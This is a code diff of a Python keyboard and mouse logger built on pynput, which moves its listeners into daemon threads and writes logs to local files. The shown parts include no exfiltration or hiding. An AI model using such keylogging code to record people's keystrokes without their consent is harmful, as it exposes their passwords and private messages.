@@ -1,6 +1,7 @@
 from pynput import keyboard, mouse
 from datetime import datetime
 import sys
+import threading
 
 #----------------------------keyboard-----------------------------
 #-----------------------------------------------------------------
@@ -29,6 +30,7 @@ Excluded_Keys = {
 
 def get_timestamp():
     return datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+
 
 def pressed(key):
     global keys, Actual
@@ -115,18 +117,30 @@ def write_File_mouse():
     Mouselogs.clear()
 
 
-# Start listeners
-keyboard_listener = keyboard.Listener(on_press=pressed, on_release=released)
-mouse_listener = mouse.Listener(on_move=move, on_click=click, on_scroll=scroll)
+#Threading
+def keyboard_thread():
+    global keyboard_listener
+    keyboard_listener = keyboard.Listener(on_press=pressed, on_release=released)
+    keyboard_listener.start()
+    keyboard_listener.join()
+    
+def mouse_thread():
+    global mouse_listener
+    mouse_listener = mouse.Listener(on_move=move, on_click=click, on_scroll=scroll)
+    mouse_listener.start()
+    mouse_listener.join()
 
-keyboard_listener.start()
-mouse_listener.start()
 
-# Keep the program running until listeners are stopped
-keyboard_listener.join()
-mouse_listener.join()
+keyboard_thread_obj = threading.Thread(target=keyboard_thread, daemon=True)
+mouse_thread_obj = threading.Thread(target=mouse_thread, daemon=True)
 
-# Close files when done
+keyboard_thread_obj.start()
+mouse_thread_obj.start()
+
+
+keyboard_thread_obj.join()
+mouse_thread_obj.join()
+
 MouselogsFile.close()
 Allkeylogsfile.close()
 keyWordslogs.close()
